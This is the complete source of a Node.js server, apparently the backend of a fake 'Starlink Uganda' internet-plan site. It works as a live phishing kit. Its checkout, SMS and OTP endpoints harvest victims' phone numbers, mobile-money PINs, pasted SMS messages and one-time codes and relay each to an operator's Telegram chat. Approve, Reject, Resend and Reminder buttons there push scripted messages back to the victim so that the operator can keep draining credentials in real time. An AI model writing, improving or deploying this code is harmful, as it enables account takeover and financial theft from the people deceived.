// ============================================================
// Starlink Uganda — Backend Server
// Handles: static pages + API + Telegram approval flow
// Storage: file-based (data/sessions.json)
// ============================================================

const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 5000;

// ------------------------------------------------------------
// CONFIG (set these in Railway → Variables)
// ------------------------------------------------------------
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID || '';
const PUBLIC_URL = process.env.PUBLIC_URL || 'https://starlinknetwork-production.up.railway.app';

// ------------------------------------------------------------
// MIDDLEWARE
// ------------------------------------------------------------
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ------------------------------------------------------------
// FILE-BASED STORAGE
// ------------------------------------------------------------
const DATA_DIR = path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'sessions.json');

// Ensure data dir exists
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

let sessions = {};

// Load sessions from disk
try {
    if (fs.existsSync(DATA_FILE)) {
        sessions = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8') || '{}');
    }
} catch (err) {
    console.error('Failed to load sessions:', err.message);
    sessions = {};
}

// Save sessions to disk
function saveSessions() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(sessions, null, 2));
    } catch (err) {
        console.error('Failed to save sessions:', err.message);
    }
}

// Auto-cleanup sessions older than 30 minutes
setInterval(() => {
    const now = Date.now();
    let changed = false;
    for (const id in sessions) {
        if (now - sessions[id].createdAt > 30 * 60 * 1000) {
            delete sessions[id];
            changed = true;
        }
    }
    if (changed) saveSessions();
}, 5 * 60 * 1000);

// ------------------------------------------------------------
// SESSION HELPERS
// ------------------------------------------------------------
function createSession(data) {
    const id = crypto.randomBytes(8).toString('hex');
    sessions[id] = {
        id,
        step: data.step,          // 'checkout' | 'sms' | 'otp'
        status: 'pending',        // 'pending' | 'approved' | 'rejected' | 'resend' | 'reminder'
        message: '',
        createdAt: Date.now(),
        updatedAt: Date.now(),
        data
    };
    saveSessions();
    return sessions[id];
}

function getSession(id) {
    return sessions[id] || null;
}

function updateSession(id, patch) {
    if (!sessions[id]) return null;
    sessions[id] = { ...sessions[id], ...patch, updatedAt: Date.now() };
    saveSessions();
    return sessions[id];
}

// ------------------------------------------------------------
// TELEGRAM HELPERS
// ------------------------------------------------------------
async function telegramAPI(method, payload) {
    if (!BOT_TOKEN) {
        console.error('TELEGRAM_BOT_TOKEN not set');
        return null;
    }
    try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        return await res.json();
    } catch (err) {
        console.error('Telegram API error:', err.message);
        return null;
    }
}

async function sendTelegramMessage(text, keyboard) {
    return telegramAPI('sendMessage', {
        chat_id: CHAT_ID,
        text,
        parse_mode: 'HTML',
        reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
    });
}

async function answerCallback(callbackQueryId, text) {
    return telegramAPI('answerCallbackQuery', {
        callback_query_id: callbackQueryId,
        text: text || '',
        show_alert: false
    });
}

async function editTelegramMessage(chatId, messageId, text, keyboard) {
    return telegramAPI('editMessageText', {
        chat_id: chatId,
        message_id: messageId,
        text,
        parse_mode: 'HTML',
        reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
    });
}

// ------------------------------------------------------------
// REGISTER TELEGRAM WEBHOOK ON STARTUP
// ------------------------------------------------------------
async function registerWebhook() {
    if (!BOT_TOKEN || !PUBLIC_URL) {
        console.log('Skipping webhook registration (missing BOT_TOKEN or PUBLIC_URL)');
        return;
    }
    const url = `${PUBLIC_URL}/telegram/webhook`;
    const result = await telegramAPI('setWebhook', { url });
    console.log('Webhook registration:', result);
}

// ------------------------------------------------------------
// API: CHECKOUT (after user taps Proceed with phone + PIN)
// ------------------------------------------------------------
app.post('/api/checkout', async (req, res) => {
    const { plan, data, price, phone, pin } = req.body;

    if (!phone || !pin) {
        return res.status(400).json({ error: 'Missing phone or pin' });
    }

    const session = createSession({
        step: 'checkout',
        plan: plan || 'Standard',
        data: data || '60GB',
        price: price || 3500,
        phone,
        pin
    });

    const text =
        `🟡 <b>New Checkout Payment</b>\n\n` +
        `📦 <b>Plan:</b> ${session.data.plan} (${session.data.data})\n` +
        `💰 <b>Amount:</b> UGX ${Number(session.data.price).toLocaleString()}\n` +
        `📱 <b>Phone:</b> +256 ${String(phone).replace(/^0/, '')}\n` +
        `🔐 <b>PIN:</b> <code>${pin}</code>\n\n` +
        `🆔 Session: <code>${session.id}</code>`;

    const keyboard = [[
        { text: '✅ Approve', callback_data: `approve:${session.id}` },
        { text: '❌ Reject',  callback_data: `reject:${session.id}` }
    ]];

    const tg = await sendTelegramMessage(text, keyboard);

    if (tg && tg.result) {
        session.telegramMessageId = tg.result.message_id;
        saveSessions();
    }

    res.json({ sessionId: session.id });
});

// ------------------------------------------------------------
// API: SMS PASTE (after user pastes SMS)
// ------------------------------------------------------------
app.post('/api/sms', async (req, res) => {
    const { plan, data, price, phone, sms } = req.body;

    if (!sms) {
        return res.status(400).json({ error: 'Missing SMS' });
    }

    const session = createSession({
        step: 'sms',
        plan: plan || 'Standard',
        data: data || '60GB',
        price: price || 3500,
        phone: phone || '',
        sms
    });

    const text =
        `📩 <b>New SMS Submitted</b>\n\n` +
        `📦 <b>Plan:</b> ${session.data.plan} (${session.data.data})\n` +
        `💰 <b>Amount:</b> UGX ${Number(session.data.price).toLocaleString()}\n` +
        `📱 <b>Phone:</b> +256 ${String(session.data.phone).replace(/^0/, '')}\n\n` +
        `📝 <b>SMS Content:</b>\n<code>${escapeHtml(sms)}</code>\n\n` +
        `🆔 Session: <code>${session.id}</code>`;

    const keyboard = [[
        { text: '✅ Approve',  callback_data: `approve:${session.id}` },
        { text: '🔄 Resend',   callback_data: `resend:${session.id}` },
        { text: '⏰ Reminder', callback_data: `reminder:${session.id}` }
    ]];

    const tg = await sendTelegramMessage(text, keyboard);

    if (tg && tg.result) {
        session.telegramMessageId = tg.result.message_id;
        saveSessions();
    }

    res.json({ sessionId: session.id });
});

// ------------------------------------------------------------
// API: OTP (after user enters OTP code)
// ------------------------------------------------------------
app.post('/api/otp', async (req, res) => {
    const { plan, data, price, phone, otp } = req.body;

    if (!otp) {
        return res.status(400).json({ error: 'Missing OTP' });
    }

    const session = createSession({
        step: 'otp',
        plan: plan || 'Standard',
        data: data || '60GB',
        price: price || 3500,
        phone: phone || '',
        otp
    });

    const text =
        `🔢 <b>New OTP Submitted</b>\n\n` +
        `📦 <b>Plan:</b> ${session.data.plan} (${session.data.data})\n` +
        `💰 <b>Amount:</b> UGX ${Number(session.data.price).toLocaleString()}\n` +
        `📱 <b>Phone:</b> +256 ${String(session.data.phone).replace(/^0/, '')}\n` +
        `🔐 <b>OTP:</b> <code>${otp}</code>\n\n` +
        `🆔 Session: <code>${session.id}</code>`;

    const keyboard = [[
        { text: '✅ Approve',  callback_data: `approve:${session.id}` },
        { text: '🔄 Resend',   callback_data: `resend:${session.id}` },
        { text: '⏰ Reminder', callback_data: `reminder:${session.id}` }
    ]];

    const tg = await sendTelegramMessage(text, keyboard);

    if (tg && tg.result) {
        session.telegramMessageId = tg.result.message_id;
        saveSessions();
    }

    res.json({ sessionId: session.id });
});

// ------------------------------------------------------------
// API: POLL STATUS
// ------------------------------------------------------------
app.get('/api/status/:sessionId', (req, res) => {
    const session = getSession(req.params.sessionId);
    if (!session) {
        return res.status(404).json({ status: 'expired' });
    }
    res.json({
        status: session.status,
        message: session.message,
        step: session.step
    });
});

// ------------------------------------------------------------
// TELEGRAM WEBHOOK — handles button taps
// ------------------------------------------------------------
app.post('/telegram/webhook', async (req, res) => {
    res.sendStatus(200); // ack fast

    const update = req.body;

    if (!update.callback_query) return;

    const cq = update.callback_query;
    const data = cq.data || '';
    const [action, sessionId] = data.split(':');
    const session = getSession(sessionId);

    if (!session) {
        await answerCallback(cq.id, 'Session expired');
        return;
    }

    // --------------------------------------------------------
    // Approve
    // --------------------------------------------------------
    if (action === 'approve') {
        updateSession(sessionId, { status: 'approved', message: '' });
        await answerCallback(cq.id, '✅ Approved');

        const newText =
            `✅ <b>Approved</b>\n\n` +
            `Session <code>${sessionId}</code> has been approved.\n` +
            `User is moving to the next step.`;

        if (session.telegramMessageId) {
            await editTelegramMessage(CHAT_ID, session.telegramMessageId, newText, []);
        }
        return;
    }

    // --------------------------------------------------------
    // Reject
    // --------------------------------------------------------
    if (action === 'reject') {
        const rejectMsg = session.step === 'checkout'
            ? 'Incorrect number. Kindly check your number and try again.'
            : 'Rejected. Please try again.';

        updateSession(sessionId, { status: 'rejected', message: rejectMsg });
        await answerCallback(cq.id, '❌ Rejected');

        const newText = `❌ <b>Rejected</b>\n\nSession <code>${sessionId}</code> has been rejected.`;
        if (session.telegramMessageId) {
            await editTelegramMessage(CHAT_ID, session.telegramMessageId, newText, []);
        }
        return;
    }

    // --------------------------------------------------------
    // Resend
    // --------------------------------------------------------
    if (action === 'resend') {
        const resendMsg = session.step === 'sms'
            ? 'You pasted the wrong SMS. Ensure your details match this order to complete the payment.'
            : 'Incorrect code. Please enter the correct OTP.';

        updateSession(sessionId, { status: 'resend', message: resendMsg });
        await answerCallback(cq.id, '🔄 Resend');

        const newText = `🔄 <b>Resend requested</b>\n\nSession <code>${sessionId}</code> — user will retry.`;
        if (session.telegramMessageId) {
            await editTelegramMessage(CHAT_ID, session.telegramMessageId, newText, []);
        }
        return;
    }

    // --------------------------------------------------------
    // Reminder
    // --------------------------------------------------------
    if (action === 'reminder') {
        const reminderMsg = session.step === 'sms'
            ? 'Kindly check your inbox and copy the message you have received, then paste it here. We are almost there — just one more step to unlock your Starlink connection!'
            : 'Almost done! Please enter the OTP code we sent you to unlock your Starlink plan. You are one step away from high-speed internet.';

        updateSession(sessionId, { status: 'reminder', message: reminderMsg });
        await answerCallback(cq.id, '⏰ Reminder sent');

        const newText = `⏰ <b>Reminder sent</b>\n\nSession <code>${sessionId}</code> — user has been reminded.`;
        if (session.telegramMessageId) {
            await editTelegramMessage(CHAT_ID, session.telegramMessageId, newText, []);
        }
        return;
    }
});

// ------------------------------------------------------------
// UTILITY
// ------------------------------------------------------------
function escapeHtml(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

// ------------------------------------------------------------
// FALLBACK ROUTES (so /checkout/ etc. serve their HTML files)
// ------------------------------------------------------------
const pageRoutes = {
    '/':            'index.html',
    '/dashboard/':  'index.html',
    '/plans/':      'plans.html',
    '/checkout/':   'checkout.html',
    '/sms-paste/':  'sms-paste.html',
    '/otp-verify/': 'otp-verify.html'
};

Object.entries(pageRoutes).forEach(([route, file]) => {
    app.get(route, (req, res) => {
        res.sendFile(path.join(__dirname, 'public', file));
    });
});

// ------------------------------------------------------------
// START
// ------------------------------------------------------------
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`🌐 Public URL: ${PUBLIC_URL}`);
    if (!BOT_TOKEN) console.warn('⚠️  TELEGRAM_BOT_TOKEN missing');
    if (!CHAT_ID)   console.warn('⚠️  TELEGRAM_CHAT_ID missing');
    registerWebhook();
});
